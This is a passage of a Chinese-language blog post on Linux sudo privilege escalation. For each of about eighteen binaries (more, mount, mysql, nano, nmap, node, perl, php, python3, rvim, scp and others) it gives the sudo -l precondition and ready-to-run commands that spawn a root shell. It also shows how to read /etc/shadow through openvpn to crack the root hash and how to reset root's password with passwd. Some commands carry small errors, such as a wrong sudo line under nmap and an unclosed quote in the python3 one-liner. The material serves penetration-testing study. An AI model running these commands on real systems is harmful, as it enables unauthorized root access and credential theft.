+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>
+
+<h2 id="sudo-more"><a href="#sudo-more" class="headerlink" title="sudo more"></a>sudo more</h2><h3 id="漏洞利用前提-30"><a href="#漏洞利用前提-30" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行more，即运行sudo -l后会有如下的行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root) NOPASSWD: /usr/bin/more</span><br></pre></td></tr></table></figure>
+
+<p> more和less类似，都是用于读取文件，提权利用也是类似less的机制，利用详见<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/more/">more | GTFOBins</a></p>
+<h3 id="操作方式-22"><a href="#操作方式-22" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><p>还是通过临时文件的方法，先建立一个临时文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mktemp ./xxx</span><br></pre></td></tr></table></figure>
+
+<p> 应该可以看到这个临时文件的名字，比如.&#x2F;7aADd，此时由于这个临时文件是空的，用more读取不会看到任何的结果，因此我们可以先将某个文件重定向到这个临时文件，这里假设bossfrank是一个已有的文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yes bossfrank &gt; 7aADd</span><br></pre></td></tr></table></figure>
+
+<p>然后通过more读取，并用!启动bash：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> more 7aADd</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>同样，使用临时文件便于隐藏痕迹。单纯为了提权也可以直接读取系统的文件。</p>
+<h2 id="sudo-mount"><a href="#sudo-mount" class="headerlink" title="sudo mount"></a>sudo mount</h2><h3 id="漏洞利用前提-31"><a href="#漏洞利用前提-31" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行mount，即运行sudo -l后会有如下的行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root) NOPASSWD: /usr/bin/mount</span><br></pre></td></tr></table></figure>
+
+<p>mount常用于文件挂载，可以挂载磁盘也可以挂载共享文件目录，利用详见<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/mount/">mount | GTFOBins</a></p>
+<h3 id="操作方式-23"><a href="#操作方式-23" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount -o bind /bin/bash /bin/mount</span><br></pre></td></tr></table></figure>
+
+<p>-o意思是option指定选项，bind用于绑定，将bash绑定到mount中，这样只要再次sudo运行mount即可提权：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount</span><br></pre></td></tr></table></figure>
+
+<h2 id="sudo-mysql"><a href="#sudo-mysql" class="headerlink" title="sudo mysql"></a>sudo mysql</h2><h3 id="漏洞利用前提-32"><a href="#漏洞利用前提-32" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行mysql，即运行sudo -l后会有如下的行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root) NOPASSWD: /usr/bin/mysql</span><br></pre></td></tr></table></figure>
+
+<p>类似mysql这种关键应用常常有执行系统命令的操作，利用详见<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/mysql/">mysql | GTFOBins</a></p>
+<h3 id="操作方式-24"><a href="#操作方式-24" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql -e &#x27;\! /bin/sh&#x27;</span><br></pre></td></tr></table></figure>
+
+<p> 其中-e表示执行系统命令，感叹号!表示开始执行系统命令，由于在bash语句中的感叹号!表示访问历史记录，因此要对感叹号!使用反斜杠\进行转义。</p>
+<h2 id="sudo-nano"><a href="#sudo-nano" class="headerlink" title="sudo nano"></a>sudo nano</h2><h3 id="漏洞利用前提-33"><a href="#漏洞利用前提-33" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行nano，即运行sudo -l后会有如下的行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root) NOPASSWD: /usr/bin/nano</span><br></pre></td></tr></table></figure>
+
+<p>nano是一个文本编辑器，其提权方式非常典型。许多工具底层都会调用nano，因此这是一类的提权方式。利用详见<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/nano/">nano | GTFOBins</a></p>
+<h3 id="操作方式-25"><a href="#操作方式-25" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><p>启动nano，可以在nano编辑器底部看到如下的菜单：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano</span><br></pre></td></tr></table></figure>
+
+<p> 输入ctrl + r选择读取文件Read File，进入读取文件的界面，其下部的菜单如下：</p>
+<p> 此处可以看到，输入ctrl + x进入Execute Command执行命令界面，然后我们只要输入要执行的系统命令即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reset;bash 1&gt;&amp;0 2&gt;&amp;0</span><br></pre></td></tr></table></figure>
+
+<p> 首先reset重置环境变量，然后启动bash并将输出和错误信息重定向，即可提权。</p>
+<h2 id="sudo-neofetch"><a href="#sudo-neofetch" class="headerlink" title="sudo neofetch"></a>sudo neofetch</h2><h3 id="漏洞利用前提-34"><a href="#漏洞利用前提-34" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行neofetch，即运行sudo -l后会有如下的行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root) NOPASSWD: /usr/bin/neofetch</span><br></pre></td></tr></table></figure>
+
+<p>neofetch本身是一个用于显示系统配置信息的命令行工具，可以通过自定义配置文件改变输出的信息和格式，实现提权，利用详见<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/neofetch/">neofetch | GTFOBins</a></p>
+<h3 id="操作方式-26"><a href="#操作方式-26" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><p>先声明一个变量TF，指向一个新建的临时文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp)</span><br></pre></td></tr></table></figure>
+
+<p> 将提权逻辑写入临时文件中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;exec /bin/bash&#x27; &gt;$TF</span><br></pre></td></tr></table></figure>
+
+<p> 最后sudo运行neofetch，同时指定这个配置文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo neofetch --config $TF</span><br></pre></td></tr></table></figure>
+
+<p> neofetch的配置文件只能通过指定文件的方式进行，因此提权逻辑只能写在文件中，无法在上述语句中直接添加执行系统命令的明文指令。运行上述指令即可提权。</p>
+<h2 id="sudo-nice"><a href="#sudo-nice" class="headerlink" title="sudo nice"></a>sudo nice</h2><h3 id="漏洞利用前提-35"><a href="#漏洞利用前提-35" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行nice，即运行sudo -l后会有如下的行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root) NOPASSWD: /usr/bin/nice</span><br></pre></td></tr></table></figure>
+
+<p>nice命令本身用于修改进程的优先级（优先级最高-20，最低19，默认为10），利用详见<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/nice/">nice | GTFOBins</a></p>
+<h3 id="操作方式-27"><a href="#操作方式-27" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><p>直接可以启动bash：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nice /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>运行即可提权。</p>
+<h2 id="sudo-nmap"><a href="#sudo-nmap" class="headerlink" title="sudo nmap"></a>sudo nmap</h2><h3 id="漏洞利用前提-36"><a href="#漏洞利用前提-36" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行nmap，即运行sudo -l后会有如下的行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root) NOPASSWD: /usr/bin/nice</span><br></pre></td></tr></table></figure>
+
+<p>nmap是常见的端口扫描工具，其中可以自定义脚本，利用详见<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/nmap/">nmap | GTFOBins</a></p>
+<h3 id="操作方式-28"><a href="#操作方式-28" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><p>nmap有许多版本，也有不同的提权方式，这里给出其中一种：首先声明一个变量TF，指向一个新建的临时文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp)</span><br></pre></td></tr></table></figure>
+
+<p>将提权逻辑echo到这个临时文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; $TF</span><br></pre></td></tr></table></figure>
+
+<p>sudo运行nmap并指定我们编写的提权脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --script=$TF</span><br></pre></td></tr></table></figure>
+
+<h2 id="sudo-node"><a href="#sudo-node" class="headerlink" title="sudo node"></a>sudo node</h2><h3 id="漏洞利用前提-37"><a href="#漏洞利用前提-37" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行node，即运行sudo -l后会有如下的行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root) NOPASSWD: /usr/bin/node</span><br></pre></td></tr></table></figure>
+
+<p>node命令用于运行Node.js，利用详见<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/node/">node | GTFOBins</a></p>
+<h3 id="操作方式-29"><a href="#操作方式-29" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><p>Node.js的选项-e可以进行提权操作：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo node -e &#x27;require(&quot;child_process&quot;).spawn(&quot;/bin/sh&quot;, &#123;stdio: [0, 1, 2]&#125;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>用-e指定字符串，字符串是Node.js的代码。执行上述命令即可提权。</p>
+<h2 id="sudo-nohup"><a href="#sudo-nohup" class="headerlink" title="sudo nohup"></a>sudo nohup</h2><h3 id="漏洞利用前提-38"><a href="#漏洞利用前提-38" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行nohup，即运行sudo -l后会有如下的行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root) NOPASSWD: /usr/bin/nohup</span><br></pre></td></tr></table></figure>
+
+<p>nohup命令主要用于作业管理，nohup可以运行命令的同时忽略挂起的信号（比如用nohup启动进程后，当终端关闭之后，进程依旧运行），利用详见<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/nohup/">nohup | GTFOBins</a></p>
+<h3 id="操作方式-30"><a href="#操作方式-30" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nohup /bin/bash -c &quot;bash &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&quot;</span><br></pre></td></tr></table></figure>
+
+<p> 先用nohup启动&#x2F;bin&#x2F;bash会话，其中-c参数对进程进行管理，将bash的输入输出重定向。运行即可提权。</p>
+<h2 id="sudo-openvpn"><a href="#sudo-openvpn" class="headerlink" title="sudo openvpn"></a>sudo openvpn</h2><h3 id="漏洞利用前提-39"><a href="#漏洞利用前提-39" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行openvpn，即运行sudo -l后会有如下的行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root) NOPASSWD: /usr/sbin/openvpn</span><br></pre></td></tr></table></figure>
+
+<p>openvpn的利用详见<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/openvpn/">openvpn | GTFOBins</a></p>
+<h3 id="操作方式-31"><a href="#操作方式-31" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><p>openvpn可以通过参数读取配置文件，如果可以sudo，则能够以root身份读取系统的敏感文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo openvpn --config /etc/shadow</span><br></pre></td></tr></table></figure>
+
+<p> 结果会报错，但报错信息会暴露敏感信息的第一行，即&#x2F;etc&#x2F;shadow的第一行，我们可以据此拿到root账户的密码hash，再用john找个字典破解即可（未必能破解出来）。</p>
+<h2 id="sudo-passwd"><a href="#sudo-passwd" class="headerlink" title="sudo passwd"></a>sudo passwd</h2><h3 id="漏洞利用前提-40"><a href="#漏洞利用前提-40" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行修改密码指令passwd，即运行sudo -l后会有如下的行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root) NOPASSWD: /usr/bin/passwd</span><br></pre></td></tr></table></figure>
+
+<p>passwd的利用就是直接修改密码。</p>
+<h3 id="操作方式-32"><a href="#操作方式-32" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><p>既然可以sudo运行passwd，那咱可以直接把root的密码改掉：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd</span><br></pre></td></tr></table></figure>
+
+<p> 然后输入两次密码，就可以用我们的新密码su提权了。虽然看着有点离谱，但是真实情况还真有可能出现这种配置情况：低权限的管理员需要修改系统的密码，就会给自己设置passwd的sudo权限。</p>
+<h2 id="sudo-perl"><a href="#sudo-perl" class="headerlink" title="sudo perl"></a>sudo perl</h2><h3 id="漏洞利用前提-41"><a href="#漏洞利用前提-41" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行perl语言，即运行sudo -l后会有如下的行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root) NOPASSWD: /usr/bin/perl</span><br></pre></td></tr></table></figure>
+
+<h3 id="操作方式-33"><a href="#操作方式-33" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><p>perl是一种脚本语言，提权方式有很多。以如下为例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo perl -e &#x27;exec &quot;/bin/sh&quot;;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p> perl语言有-e参数，用于直接执行perl脚本，按照这种方式，直接执行启动bash即可，运行上述命令即可直接提权。</p>
+<h2 id="sudo-php"><a href="#sudo-php" class="headerlink" title="sudo php"></a>sudo php</h2><h3 id="漏洞利用前提-42"><a href="#漏洞利用前提-42" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行php，即运行sudo -l后会有如下的行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root) NOPASSWD: /usr/bin/php</span><br></pre></td></tr></table></figure>
+
+<h3 id="操作方式-34"><a href="#操作方式-34" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><p> php也是常见的语言，在渗透测试过程中更是尤为常见。我们应该能想到许多提权语句。这里采用一种简单直观的，直接用-r参数启动bash。在web渗透中这些操作也是非常实用的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo php -r &quot;system(&#x27;/bin/bash&#x27;);&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="sudo-pico"><a href="#sudo-pico" class="headerlink" title="sudo pico"></a>sudo pico</h2><h3 id="漏洞利用前提-43"><a href="#漏洞利用前提-43" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行pico，即运行sudo -l后会有如下的行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root) NOPASSWD: /usr/bin/pico</span><br></pre></td></tr></table></figure>
+
+<p>pico和nano非常相似，也是一种编辑器（功能与nano有差异），利用详见<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/pico/">pico | GTFOBins</a></p>
+<h3 id="操作方式-35"><a href="#操作方式-35" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><p>这里的操作和nano的提权方式基本一致，懒得讲了，总之就是如下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pico</span><br><span class="line">^R^X</span><br><span class="line">reset; bash 1&gt;&amp;0 2&gt;&amp;0</span><br></pre></td></tr></table></figure>
+
+<p>其中ctrl + r选择Read File模式，ctrl + x选择执行命令Execute Commend</p>
+<h2 id="sudo-pkexec"><a href="#sudo-pkexec" class="headerlink" title="sudo pkexec"></a>sudo pkexec</h2><h3 id="漏洞利用前提-44"><a href="#漏洞利用前提-44" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行pkexec，即运行sudo -l后会有如下的行：</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root) NOPASSWD: /usr/bin/pkexec</span><br></pre></td></tr></table></figure></blockquote>
+<p>pk就是policykit策略套件的简称，是一种用于管理系统策略的服务。policykit可以允许非特权进程通信以进行特权操作。利用详见<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/pkexec/">pkexec | GTFOBins</a></p>
+<h3 id="操作方式-36"><a href="#操作方式-36" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><p>pkexec这个工具可以进行权限相关的操作，执行用户指定的程序，这里就是启动bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pkexec /bin/bash</span><br></pre></td></tr></table></figure>
+
+<h2 id="sudo-python3"><a href="#sudo-python3" class="headerlink" title="sudo python3"></a>sudo python3</h2><h3 id="漏洞利用前提-45"><a href="#漏洞利用前提-45" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行python3，即运行sudo -l后会有如下的行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root) NOPASSWD: /usr/bin/python3</span><br></pre></td></tr></table></figure>
+
+<h3 id="操作方式-37"><a href="#操作方式-37" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><p>我们通常用python语句进行反射，提高shell的交互性，这里也可以直接利用语句启动shell:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 -c &quot;import os;os.system(&#x27;/bin/bash)&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="sudo-rvim"><a href="#sudo-rvim" class="headerlink" title="sudo rvim"></a>sudo rvim</h2><h3 id="漏洞利用前提-46"><a href="#漏洞利用前提-46" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行rvim，即运行sudo -l后会有如下的行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root) NOPASSWD: /usr/bin/rvim</span><br></pre></td></tr></table></figure>
+
+<p>rvim是vim编辑器的一个特定版本，其中表示restricted受限模式，在rvim中的操作相比于vim，做了很多限制，禁用了许多可能危害系统的命令。利用详见<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/rvim/">rvim | GTFOBins</a></p>
+<h3 id="操作方式-38"><a href="#操作方式-38" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rvim -c &#x27;:py import os; os.execl(&quot;/bin/bash&quot;, &quot;bash&quot;, &quot;-c&quot;, &quot;reset; exec bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>执行即可提权，单引号中的内容是通过python编写启动shell会话的代码，其中冒号:是vim的语法，表示执行系统命令。</p>
+<h2 id="sudo-scp"><a href="#sudo-scp" class="headerlink" title="sudo scp"></a>sudo scp</h2><h3 id="漏洞利用前提-47"><a href="#漏洞利用前提-47" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行scp，即运行sudo -l后会有如下的行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root) NOPASSWD: /usr/bin/scp</span><br></pre></td></tr></table></figure>
+
+<p>scp是secure copy的缩写，用于Linux中的基于ssh的远程文件复制，功能类似与cp，但可以跨服务器复制。利用详见<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/scp/">scp | GTFOBins</a></p>
+<h3 id="操作方式-39"><a href="#操作方式-39" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><p>提权时需要指定参数-S，表示指定SSH程序，可在其中指定ssh逻辑。先用一个变量TF指向临时文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp)</span><br></pre></td></tr></table></figure>
+
+<p>然后将提权逻辑写到临时变量中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;bash 0&lt;&amp;2 1&gt;&amp;2&#x27; &gt; $TF</span><br></pre></td></tr></table></figure>
+
+<p>给变量（临时文件）添加执行权限：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x &quot;$TF&quot;</span><br></pre></td></tr></table></figure>
+
+<p>然后用-S参数指定临时文件，此处的$TF是作为ssh程序给出，同时要指定源文件和目标文件，由于我们只是想提权，并不想真的copy，因此随便写一个x和y即可，冒号:用于区分本地文件和远程文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo scp -S $TF x y:</span><br></pre></td></tr></table></figure>
+</div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><span class="icon iconify" data-icon="ri:hand-coin-line"></span></span><div id="reward-comment">I'm so cute. Please give me money.</div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>伊卡洛维奇</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://lunereal.1kal0vic.top/2025/11/29/Linux%E6%8F%90%E6%9D%83/" title="linux sudo提权">http://lunereal.1kal0vic.top/2025/11/29/Linux%E6%8F%90%E6%9D%83/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2025/12/17/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/" rel="prev" title=""><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text"></span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2025/11/27/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/" rel="next" title=""><span class="post-nav-text"></span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2024 – 2026 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> 伊卡洛维奇</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.3.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div class="live-time"><span>感谢陪伴</span><span id="display_live_time"></span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
+  setTimeout(blog_live_time, 1000);
+  const start = new Date('2024-03-20T00:00:00');
+  const now = new Date();
+  const timeDiff = (now.getTime() - start.getTime());
+  const msPerMinute = 60 * 1000;
+  const msPerHour = 60 * msPerMinute;
+  const msPerDay = 24 * msPerHour;
+  const passDay = Math.floor(timeDiff / msPerDay);
+  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
+  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
+  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
+  display_live_time.innerHTML = ` ${passDay} 天 ${passHour} 小时 ${passMinute} 分 ${passSecond} 秒`;
+}
+blog_live_time();
+</script></div><div class="footer-custom-text">YourText <a href="yourLink" rel="noopener" target="_blank">Description</a></div><div class="footer-support"><span>本站由</span><a class="footer-support-logo" href="https://www.rainyun.com/YeMeng_" target="blank" title="雨云"><img height="30" src="https://cn-sy1.rains3.com/yemenghexo/rainyunlogo.png" alt="雨云"></a><span>提供 对象存储 服务</span></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
+mediumZoom(images)</script><style>.medium-zoom-image {
+  z-index: 99;
+}</style></body></html>
